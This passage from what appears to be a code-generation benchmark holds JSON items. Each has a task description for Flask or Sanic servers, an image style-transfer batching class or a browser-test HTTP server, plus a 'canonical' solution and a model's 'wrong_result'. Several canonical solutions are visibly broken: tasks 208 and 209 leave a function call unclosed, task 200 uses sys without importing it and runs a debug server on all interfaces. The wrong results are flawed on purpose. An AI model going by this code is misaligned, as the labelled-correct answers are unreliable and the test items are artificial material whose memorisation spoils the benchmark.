  dataset_info = {\n            \"repo_id\": f\"{dataset_namespace}/{dataset_name}\",\n            \"num_samples\": dataset.num_frames\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_frames,\n            \"num_episodes\": dataset.num_episodes\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_episodes,\n            \"fps\": dataset.fps,\n        }\n        if isinstance(dataset, LeRobotDataset):\n            video_paths = [\n                dataset.meta.get_video_file_path(episode_id, key) for key in dataset.meta.video_keys\n            ]\n            videos_info = [\n                {\"url\": url_for(\"static\", filename=video_path), \"filename\": video_path.parent.name}\n                for video_path in video_paths\n            ]\n            tasks = dataset.meta.episodes[0][\"tasks\"]\n        else:\n            video_keys = [key for key, ft in dataset.features.items() if ft[\"dtype\"] == \"video\"]\n            videos_info = [\n                {\n                    \"url\": f\"https://huggingface.co/datasets/{repo_id}/resolve/main/\"\n                    + dataset.video_path.format(\n                        episode_chunk=int(episode_id) // dataset.chunks_size,\n                        video_key=video_key,\n                        episode_index=episode_id,\n                    ),\n                    \"filename\": video_key,\n                }\n                for video_key in video_keys\n            ]\n\n            response = requests.get(\n                f\"https://huggingface.co/datasets/{repo_id}/resolve/main/meta/episodes.jsonl\"\n            )\n            response.raise_for_status()\n            # Split into lines and parse each line as JSON\n            tasks_jsonl = [json.loads(line) for line in response.text.splitlines() if line.strip()]\n\n            filtered_tasks_jsonl = [row for row in tasks_jsonl if row[\"episode_index\"] == episode_id]\n            tasks = filtered_tasks_jsonl[0][\"tasks\"]\n\n        videos_info[0][\"language_instruction\"] = tasks\n\n        if episodes is None:\n            episodes = list(\n                range(dataset.num_episodes if isinstance(dataset, LeRobotDataset) else dataset.total_episodes)\n            )\n\n        return render_template(\n            \"visualize_dataset_template.html\",\n            episode_id=episode_id,\n            episodes=episodes,\n            dataset_info=dataset_info,\n            videos_info=videos_info,\n            episode_data_csv_str=episode_data_csv_str,\n            columns=columns,\n        )\n\n    app.run(host=host, port=port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, redirect, render_template, request, url_for\nfrom typing import Union, Optional, List, Tuple\nimport os\nfrom pathlib import Path\nimport json\n\nclass LeRobotDataset:\n    def __init__(self, name, namespace):\n        self.name = name\n        self.namespace = namespace\n        self.episodes = list(range(10))  # Dummy data for example\n\n    def get_episode(self, episode_id):\n        return {\"video_url\": f\"/static/videos/{episode_id}.mp4\", \"task\": f\"Task {episode_id}\"}\n\nIterableNamespace = type('IterableNamespace', (object,), {'__iter__': lambda self: iter([])})\n\ndef run_server(\n    dataset: Union[LeRobotDataset, IterableNamespace, None],\n    episodes: Optional[List[int]] = None,\n    host: str = \"127.0.0.1\",\n    port: str = \"5000\",\n    static_folder: Path = Path(__file__).parent / \"static\",\n    template_folder: Path = Path(__file__).parent / \"templates\"\n):\n    app = Flask(__name__, static_folder=static_folder, template_folder=template_folder)\n\n    @app.route(\"/\")\n    def homepage():\n        if not dataset or isinstance(dataset, LeRobotDataset):\n            if hasattr(dataset, 'episodes') and len(dataset.episodes) > 0:\n                return redirect(url_for(\"show_first_episode\", dataset_namespace=dataset.namespace, dataset_name=dataset.name))\n            else:\n                return render_template(\"index.html\", datasets=[\"example_dataset\"])\n        return render_template(\"index.html\")\n\n    def show_first_episode(dataset_namespace: str, dataset_name: str):\n        dataset_obj = LeRobotDataset(name=dataset_name, namespace=dataset_namespace)\n        first_episode_id = dataset_obj.episodes[0] if dataset_obj.episodes else 0\n        return redirect(url_for(\"show_episode\", dataset_namespace=dataset_namespace, dataset_name=dataset_name, episode_id=first_episode_id))\n\n    @app.route(\"/<dataset_namespace>/<dataset_name>/episode/<int:episode_id>\")\n    def show_episode(dataset_namespace: str, dataset_name: str, episode_id: int):\n        dataset_obj = LeRobotDataset(name=dataset_name, namespace=dataset_namespace)\n        try:\n            episode_data = dataset_obj.get_episode(episode_id)\n        except Exception as e:\n            return str(e), 404\n\n        return render_template(\n            \"episode.html\",\n            dataset_namespace=dataset_namespace,\n            dataset_name=dataset_name,\n            episode_id=episode_id,\n            video_url=episode_data[\"video_url\"],\n            task_description=episode_data[\"task\"]\n        )\n\n    app.run(host=host, port=port)\n```"
  },
  {
    "Task_id": 200,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints that return different responses, including a main API endpoint, a root endpoint, and a static file endpoint that will be overridden by Nginx.\n\nFunction Description: The code creates a Flask application with three routes:\n1. An API endpoint (\"/api\") that returns a greeting message with Python version information\n2. A root endpoint (\"/\") that returns a basic message\n3. A static file endpoint (\"/content/test.txt\") that returns a message which will be overridden by Nginx\n\nInput: None (Flask automatically handles incoming HTTP requests)\n\nOutput: \n- For \"/api\" endpoint: A string containing a greeting message with Python version\n- For \"/\" endpoint: A string \"API response overriden by Nginx\"\n- For \"/content/test.txt\" endpoint: A string \"Not run, Nginx overrides to serve static file\"",
    "Canonical_solution": "from flask import Flask\ncustom_app = Flask(__name__)\n\n@custom_app.route(\"/api\")\ndef hello():\n    version = \"{}.{}\".format(sys.version_info.major, sys.version_info.minor)\n    message = \"Hello World from Flask in a uWSGI Nginx Docker container with Python {} - testing\".format(\n        version\n    )\n    return message\n\n@custom_app.route(\"/\")\ndef main():\n    return \"API response overriden by Nginx\"\n\n@custom_app.route(\"/content/test.txt\")\ndef static_test():\n    return \"Not run, Nginx overrides to serve static file\"\n\nif __name__ == \"__main__\":\n    custom_app.run(host=\"0.0.0.0\", debug=True, port=80)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask\nimport sys\n\napp = Flask(__name__)\n\n@app.route(\"/api\")\ndef api():\n    return f\"Hello from the API endpoint! Python version: {sys.version}\"\n\n@app.route(\"/\")\ndef root():\n    return \"API response overridden by Nginx\"\n\n@app.route(\"/content/test.txt\")\ndef static_file():\n    return \"Not run, Nginx overrides to serve static file\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5000)\n```"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Create a Python class that manages a queue-based system for processing image style transfer requests using a pre-trained PyTorch model, with asynchronous batch processing capabilities.\n\nClass Description: ModelRunner is a class that handles asynchronous processing of image style transfer requests using a PyTorch model. It manages a queue system with configurable batch processing, queue limits, and wait times to efficiently process incoming requests.\n\nAttributes:\n- model_name: str - Path to the pre-trained PyTorch model file\n- queue: list - Stores pending processing tasks\n- queue_lock: asyncio.Lock - Synchronization lock for queue access\n- model: torch.jit.ScriptModule - Loaded PyTorch model\n- needs_processing: asyncio.Event - Signals when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with the specified model file\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Executes the model on the input batch (synchronous)\n- model_runner() -> None - Main processing loop that handles batch processing asynchronously",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw, text\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = torch.jit.load(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\"done_event\": asyncio.Event(loop=app.loop),\n                    \"input\": input,\n                    \"time\": app.loop.time()}\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return text(e.handling_msg, status=e.handling_code)\n\nstyle_transfer_runner = ModelRunner(sys.argv[1])\napp.add_task(style_transfer_runner.model_runner())",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nimport asyncio\nimport torch\nfrom typing import List, Tuple\n\nclass ModelRunner:\n    def __init__(self, model_name: str):\n        self.model_name = model_name\n        self.queue: List[Tuple[torch.Tensor, asyncio.Future]] = []\n        self.queue_lock = asyncio.Lock()\n        self.model = torch.jit.load(model_name)\n        self.model.eval()\n        self.needs_processing = asyncio.Event()\n        self.loop = asyncio.get_event_loop()\n        self.needs_processing_timer = None\n        self.processing_task = self.loop.create_task(self.model_runner())\n\n    async def schedule_processing_if_needed(self) -> None:\n        if not self.needs_processing.is_set():\n            self.needs_processing.set()\n            if self.needs_processing_timer is None:\n                self.needs_processing_timer = self.loop.call_later(0.1, lambda: self.loop.create_task(self.needs_processing.wait()))\n\n    async def process_input(self, input: torch.Tensor) -> torch.Tensor:\n        output_future = asyncio.Future()\n        async with self.queue_lock:\n            self.queue.append((input, output_future))\n            await self.schedule_processing_if_needed()\n        result = await output_future\n        return result\n\n    def run_model(self, batch: torch.Tensor) -> torch.Tensor:\n        with torch.no_grad():\n            return self.model(batch)\n\n    async def model_runner(self) -> None:\n        while True:\n            await self.needs_processing.wait()\n            async with self.queue_lock:\n                if not self.queue:\n                    self.needs_processing.clear()\n                    continue\n                inputs, futures = zip(*self.queue)\n                batch = torch.cat(inputs, dim=0)\n                self.queue = []\n            outputs = self.run_model(batch)\n            for i, future in enumerate(futures):\n                future.set_result(outputs[i])\n            self.needs_processing.clear()\n```"
  },
  {
    "Task_id": 209,
    "Instruction": "Task Description: Implement an asynchronous HTTP server using Sanic framework that processes image style transfer requests, with batching and queue management for efficient model inference.\n\nClass Description: ModelRunner is a class that manages a queue of image processing tasks, batches them efficiently, and runs them through a pretrained PyTorch model for style transfer.\n\nAttributes:\n- model_name: str - Name of the pretrained model to use\n- queue: list - List of pending image processing tasks\n- queue_lock: asyncio.Lock - Lock for thread-safe queue operations\n- model: torch.nn.Module - Loaded pretrained model\n- needs_processing: asyncio.Event - Event signaling when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with specified model name\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Runs the model on a batch of inputs (synchronous)\n- model_runner() -> None - Main processing loop that handles batching and model execution\n\nFunction Description: The image endpoint handles HTTP PUT requests containing image data, processes them through the style transfer model, and returns the transformed image.\n\nInput:\n- request: sanic.Request - HTTP request object containing image data in the body\n\nOutput:\n- sanic.response.raw - Processed image in JPEG format, or error message if processing fails",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = get_pretrained_model(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\n            \"done_event\": asyncio.Event(loop=app.loop),\n            \"input\": input,\n            \"time\": app.loop.time()\n        }\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return sanic.response.text(e.handling_msg, status=e.handling_code)",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nimport asyncio\nimport torch\nfrom sanic import Sanic, response\nfrom sanic.request import Request\nfrom io import BytesIO\nfrom PIL import Image\nimport numpy as np\n\napp = Sanic(__name__)\n\nclass ModelRunner:\n    def __init__(self, model_name: str):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = asyncio.Lock()\n        self.model = self.load_model(model_name)\n        self.model.eval()\n        self.needs_processing = asyncio.Event()\n        self.loop = asyncio.get_event_loop()\n        self.needs_processing_timer = None\n        self.processing_task = self.loop.create_task(self.model_runner())\n\n    def load_model(self, model_name: str) -> torch.nn.Module:\n        # Placeholder for actual model loading logic\n        if model_name == \"style_transfer\":\n            return torch.hub.load('pytorch/vision:v0.10.0', 'deeplabv3_resnet50', pretrained=True)\n        else:\n            raise ValueError(f\"Unsupported model name: {model_name}\")\n\n    def schedule_processing_if_needed(self):\n        async def callback():\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            async with self.queue_lock:\n                if self.queue:\n                    batch = torch.stack(self.queue)\n                    self.queue.clear()\n                    result = self.run_model(batch)\n                    for idx, output in enumerate(result):\n                        self.queue.append((True, output))\n                    self.needs_processing.set()\n\n        if self.needs_processing_timer:\n            self.needs_processing_timer.cancel()\n        self.needs_processing_timer = self.loop.call_later(0.1, lambda: self.loop.create_task(callback()))\n\n    async def process_input(self, input: torch.Tensor) -> torch.Tensor:\n        async with self.queue_lock:\n            self.queue.append(input)\n            if len(self.queue) >= 4:\n                self.needs_processing.set()\n            else:\n                self.schedule_processing_if_needed()\n        while True:\n            async with self.queue_lock:\n                if self.queue and isinstance(self.queue[0], tuple) and self.queue[0][0]:\n                    _, output = self.queue.pop(0)\n                    return output\n            await asyncio.sleep(0.01)\n\n    def run_model(self, batch: torch.Tensor) -> torch.Tensor:\n        with torch.no_grad():\n            return self.model(batch)\n\n    async def model_runner(self):\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            async with self.queue_lock:\n                if not self.queue:\n                    continue\n                batch = torch.stack(self.queue)\n                self.queue.clear()\n                results = self.run_model(batch)\n                for result in results:\n                    self.queue.append((True, result))\n                self.needs_processing.set()\n\n\nmodel_runner = ModelRunner(\"style_transfer\")\n\n@app.put(\"/image\")\nasync def image(request: Request):\n    try:\n        image_data = request.body\n        pil_image = Image.open(BytesIO(image_data)).convert(\"RGB\").resize((256, 256))\n        img_tensor = torch.tensor(np.array(pil_image)).permute(2, 0, 1).float() / 255.0\n        img_tensor = img_tensor.unsqueeze(0)\n        processed_tensor = await model_runner.process_input(img_tensor)\n        processed_img = (processed_tensor.squeeze().permute(1, 2, 0).clamp(0, 1).numpy() * 255).astype(np.uint8)\n        pil_result = Image.fromarray(processed_img)\n        buffer = BytesIO()\n        pil_result.save(buffer, format=\"JPEG\")\n        return response.raw(buffer.getvalue(), content_type=\"image/jpeg\")\n    except Exception as e:\n        return response.json({\"error\": str(e)}, status=500)\n```"
  },
  {
    "Task_id": 211,
    "Instruction": "Task Description: Create a Sanic-based HTTP server for handling text embedding requests using an ONNX backend, with configurable GPU usage and worker processes.\n\nFunction Description: The function `setup_embedding_server` initializes and runs a Sanic web server that provides an embedding service. It sets up a single POST endpoint `/embedding` that processes text inputs and returns their embeddings using an ONNX-based backend. The server can be configured to use GPU acceleration and multiple worker processes.\n\nInput:\n- `use_gpu`: [Boolean] - Optional flag indicating whether to use GPU acceleration (default: False)\n- `workers`: [Integer] - Optional number of worker processes to spawn (default: 1)\n\nOutput:\n- None (The function runs indefinitely as a web server)\n- The server responds to POST requests at `/embedding` with JSON-formatted embedding results",
    "Canonical_solution": "import sys\nimport os\nfrom sanic import Sanic\nfrom sanic.response import json\nfrom qanything_kernel.dependent_server.embedding_server.embedding_onnx_backend import EmbeddingOnnxBackend\nimport argparse\n\ndef setup_embedding_server(use_gpu=False, workers=1):\n    app = Sanic(\"embedding_server\")\n\n    @app.route(\"/embedding\", methods=[\"POST\"])\n    async def embedding(request):\n        data = request.json\n        texts = data.get('texts')\n        onnx_backend: EmbeddingOnnxBackend = request.app.ctx.onnx_backend\n        result_data = onnx_backend.predict(texts)\n        return json(result_data)\n\n    @app.listener('before_server_start')\n    async def setup_onnx_backend(app, loop):\n        app.ctx.onnx_backend = EmbeddingOnnxBackend(use_cpu=not use_gpu)\n\n    app.run(host=\"0.0.0.0\", port=9001, workers=workers)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--use_gpu', action=\"store_true\", help='use gpu or not')\n    parser.add_argument('--workers', type=int, default=1, help='workers')\n    args = parser.parse_args()\n    setup_embedding_server(use_gpu=args.use_gpu, workers=args.workers)",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nfrom sanic import Sanic, response\nfrom sanic.request import Request\nimport onnxruntime as ort\nimport numpy as np\nimport json\n\napp = Sanic(\"EmbeddingServer\")\n\n# Example embedding model expects input shape (1,) of strings and outputs a float32 array of shape (768,)\n# Replace this with your actual model path and preprocessing logic\nMODEL_PATH = \"model.onnx\"\n\n# Initialize ONNX session\nproviders = [\"CUDAExecutionProvider\"] if use_gpu else [\"CPUExecutionProvider\"]\nsession = ort.InferenceSession(MODEL_PATH, providers=providers)\n\n@app.post(\"/embedding\")\nasync def embedding(request: Request):\n    data = request.json\n    text = data.get(\"text\", \"\")\n    \n    # Simulate input tokenization or processing needed for the model\n    # This is just an example; replace with your model's preprocessing\n    input_ids = np.array([101, 1045, 1005, 2345, 1006, 102], dtype=np.int64).reshape(1, -1)\n    \n    # Run inference\n    inputs = {\"input_ids\": input_ids}\n    outputs = session.run(None, inputs)\n    \n    # Convert output to list for JSON serialization\n    embedding_result = outputs[0].tolist()\n    \n    return response.json({\"embedding\": embedding_result})\n\ndef setup_embedding_server(use_gpu=False, workers=1):\n    app.run(host=\"0.0.0.0\", port=8000, workers=workers)\n```"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for testing purposes, allowing communication between a test suite and a web browser through queues, and handling HTML snippet transmission.\n\nClass Description: The class should implement a custom HTTP server that can receive HTML snippets from a test suite and serve them to a web browser, while also facilitating bidirectional communication between the test suite and server using thread-safe queues.\n\nAttributes:\n\nLOCAL_IP: [str] - The local IP address to bind the server to (default: '127.0.0.1')\nPORT: [int] - The port number to run the server on (default: 28546)\nREQUEST_HANDLER_CLASS: [class] - The custom request handler class to use (default: HTMLSnippetSender)\nto_server_queue: [Queue] - Queue for sending data from test suite to server\nfrom_server_queue: [Queue] - Queue for receiving data from server to test suite\nserver: [HTTPServer] - The HTTP server instance\nserver_thread: [Thread] - Thread running the server\n\nMethods:\n\nsetUpClass: [classmethod]() -> None - Class method to initialize the server and queues before tests\ntearDownClass: [classmethod]() -> None - Class method to clean up server resources after tests\nsend_to_server: [method](value: Any) -> None - Sends data to the server through the input queue\nrecv_from_server: [method](non_blocking: bool = False) -> Any - Receives data from server through output queue (optionally non-blocking)\nopen_url: [method](path: str) -> None - Constructs and opens a URL to the test server in the browser\n\nHTMLSnippetSender Class Description: A custom HTTP request handler that manages HTML snippet transmission between server and browser.\n\nAttributes:\n\nlast_html: [bytes] - Buffer storing the last received HTML snippet\n\nMethods:\n\ndo_GET: [method]() -> None - Handles GET requests, serving the last HTML snippet for root path\nget_last_html: [method]() -> bytes - Retrieves the most recent HTML snippet from the queue\nrecv_from_testsuite: [method](non_blocking: bool = False) -> Any - Receives data from test suite queue (optionally non-blocking)\nsend_to_testsuite: [method](value: Any) -> None - Sends data to test suite through output queue\nlog_request: [method](code: str = '-', size: str = '-') -> None - Overrides default request logging (empty implementation)",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom queue import Queue\nfrom threading import Thread\nfrom urllib.parse import urlunsplit\n\nclass HTMLSnippetSender(BaseHTTPRequestHandler):\n    last_html = b''\n\n    def get_last_html(self):\n        while True:\n            value = self.recv_from_testsuite(non_blocking=True)\n            if value is None:\n                break\n            self.last_html = value\n        return self.last_html\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-Type', 'text/html; charset=utf-8')\n            self.end_headers()\n            self.wfile.write(self.get_last_html().encode('utf-8'))\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n    def recv_from_testsuite(self, non_blocking=False):\n        q = self.server.in_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def send_to_testsuite(self, value):\n        self.server.out_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\nclass BaseBrowserTest:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    @classmethod\n    def setUpClass(cls):\n        cls.to_server_queue = Queue()\n        cls.from_server_queue = Queue()\n        cls.server = HTTPServer((cls.LOCAL_IP, cls.PORT),\n                              cls.REQUEST_HANDLER_CLASS)\n        cls.server.in_queue = cls.to_server_queue\n        cls.server.out_queue = cls.from_server_queue\n        cls.server_thread = Thread(target=cls.server.serve_forever)\n        cls.server_thread.daemon = True\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server.server_close()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        q = self.from_server_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def open_url(self, path):\n        self.driver.get(urlunsplit(\n            ('http', '{}:{}'.format(\n                self.LOCAL_IP, self.PORT), path, '', '')))",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport threading\nimport http.server\nimport socketserver\nimport queue\nimport webbrowser\nimport threading\nfrom urllib.parse import urlparse\nimport socket\n\nclass HTMLSnippetSender(http.server.BaseHTTPRequestHandler):\n    last_html = b''\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(self.get_last_html())\n        else:\n            self.send_error(404, \"File not found\")\n\n    def get_last_html(self):\n        return HTMLSnippetSender.last_html\n\n    def recv_from_testsuite(self, non_blocking=False):\n        q = getattr(self.server, 'to_server_queue', None)\n        if not q:\n            return None\n        try:\n            if non_blocking:\n                return q.get_nowait()\n            else:\n                return q.get()\n        except queue.Empty:\n            return None\n\n    def send_to_testsuite(self, value):\n        q = getattr(self.server, 'from_server_queue', None)\n        if q:\n            q.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\n\nclass TestHTTPServer:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    def __init__(self):\n        self.to_server_queue = queue.Queue()\n        self.from_server_queue = queue.Queue()\n        self.server = None\n        self.server_thread = None\n\n    @classmethod\n    def setUpClass(cls):\n        server_class = cls\n        handler_class = cls.REQUEST_HANDLER_CLASS\n        handler_class.last_html = b''\n        server = socketserver.TCPServer((server_class.LOCAL_IP, server_class.PORT), handler_class)\n        server.to_server_queue = queue.Queue()\n        server.from_server_queue = queue.Queue()\n        server_thread = threading.Thread(target=server.serve_forever)\n        server_thread.daemon = True\n        server_thread.start()\n        cls.server = server\n        cls.server_thread = server_thread\n\n    @classmethod\n    def tearDownClass(cls):\n        if cls.server:\n            cls.server.shutdown()\n            cls.server.server_close()\n        if cls.server_thread:\n            cls.server_thread.join()\n\n    def send_to_server(self, value):\n        if hasattr(self, 'server') and self.server:\n            self.server.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        try:\n            if non_blocking:\n                return self.from_server_queue.get_nowait()\n            else:\n                return self.from_server_queue.get()\n        except queue.Empty:\n            return None\n\n    def open_url(self, path):\n        url = f'http://{self.LOCAL_IP}:{self.PORT}{path}'\n        webbrowser.open(url)\n```"
  },
  {
    "Task_id": 219,
